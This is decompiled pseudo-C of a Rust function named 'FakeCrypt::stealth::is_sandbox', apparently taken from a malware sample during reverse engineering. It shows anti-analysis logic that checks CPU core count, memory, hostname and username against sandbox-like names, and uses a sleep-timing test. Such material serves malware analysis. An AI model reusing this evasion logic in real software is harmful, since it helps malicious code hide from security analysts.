ulong _ZN9FakeCrypt7stealth10is_sandbox17hafd329d2780dcab4E(void)

{
  char cVar1;
  ulong uVar2;
  undefined7 uVar3;
  undefined auVar4 [16];
  undefined auVar5 [12];
  undefined **local_218;
  undefined **local_210;
  undefined8 local_208;
  undefined local_200 [8];
  undefined8 local_1f8;
  undefined8 local_1f0;
  undefined local_1e8 [24];
  undefined local_1d0 [360];
  ulong local_68;
  
  (*(code *)PTR__ZN7sysinfo6common6System7new_all17hc9da36646fff1f13E_001deaa8)(local_1d0);
                    /* try { // try from 00150c26 to 00150c6a has its CatchHandler @ 00150de1 */
  auVar4 = (*(code *)PTR__ZN7sysinfo6common6System19physical_core_count17hdbb8393c4be371fbE_001deab0
           )(local_1d0);
  uVar3 = (undefined7)((ulong)local_1d0 >> 8);
  uVar2 = CONCAT71(uVar3,1);
  if ((((auVar4 & (undefined  [16])0x1) != (undefined  [16])0x0) && (1 < auVar4._8_8_)) &&
     (0x1fffff < local_68)) {
    (*(code *)PTR__ZN8hostname3get17h3b1635af47d30924E_001deab8)(&local_218);
    _ZN4core6result19Result_LT_T_C_E_GT_17unwrap_or_default17hf494175ec33b8dd0E
              (local_200,&local_218);
                    /* try { // try from 00150c75 to 00150c7d has its CatchHandler @ 00150db4 */
    (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h6007208a5a0b939dE_001deac0)
              (&local_218,local_1f8,local_1f0);
                    /* try { // try from 00150c88 to 00150c92 has its CatchHandler @ 00150da7 */
    (*(code *)PTR__ZN5alloc3str21__LT_impl_u20_str_GT_12to_lowercase17ha0815f2983b5f9c9E_001dea98)
              (local_1e8,local_210,local_208);
                    /* try { // try from 00150c93 to 00150c9a has its CatchHandler @ 00150d98 */
    _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17h422f01b5a2867946E(&local_218)
    ;
                    /* try { // try from 00150c9b to 00150cd8 has its CatchHandler @ 00150dd2 */
    _ZN4core3ptr47drop_in_place_LT_std__ffi__os_str__OsString_GT_17h7a05ee20b892fddbE(local_200);
    local_218 = &PTR_s_sandboxmaltest_001d91f0;
    local_210 = &PTR_s_adminmalware_001d9230;
    cVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_3any17h26f2523e8bc586faE
                      (&local_218,local_1e8);
    if (cVar1 == '\0') {
      _ZN6whoami3api8username17h560cc38fa776b431E(&local_218);
                    /* try { // try from 00150ce3 to 00150ced has its CatchHandler @ 00150d8b */
      (*(code *)PTR__ZN5alloc3str21__LT_impl_u20_str_GT_12to_lowercase17ha0815f2983b5f9c9E_001dea98)
                (local_200,local_210,local_208);
                    /* try { // try from 00150cee to 00150d41 has its CatchHandler @ 00150dc3 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(&local_218);
      local_218 = &PTR_s_adminmalware_001d9230;
      local_210 = &PTR_s__root__cargo_registry_src_index__001d9260;
      cVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_3any17h26f2523e8bc586faE
                        (&local_218,local_200);
      if (cVar1 == '\0') {
        auVar5 = (*(code *)PTR__ZN3std4time7Instant3now17h2e7a0929984309fcE_001deac8)();
        local_218 = auVar5._0_8_;
        local_210 = (undefined **)CONCAT44(local_210._4_4_,auVar5._8_4_);
        (*(code *)PTR__ZN3std6thread5sleep17h542b9c721528a25aE_001dead0)(2,0);
        uVar2 = (*(code *)PTR__ZN3std4time7Instant7elapsed17h3ed9b8e557e470d7E_001dead8)(&local_218)
        ;
        if (1 < uVar2) {
                    /* try { // try from 00150d73 to 00150d7c has its CatchHandler @ 00150dd2 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_200);
                    /* try { // try from 00150d7d to 00150d86 has its CatchHandler @ 00150de1 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_1e8);
          uVar2 = 0;
          goto LAB_00150d5e;
        }
      }
                    /* try { // try from 00150d48 to 00150d51 has its CatchHandler @ 00150dd2 */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_200);
    }
    uVar2 = CONCAT71(uVar3,1);
                    /* try { // try from 00150d54 to 00150d5d has its CatchHandler @ 00150de1 */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17ha63171d2b15b0f17E(local_1e8);
  }
LAB_00150d5e:
  _ZN4core3ptr44drop_in_place_LT_sysinfo__common__System_GT_17hc8fe3377c4e9e53bE(local_1d0);
  return uVar2 & 0xffffffff;
}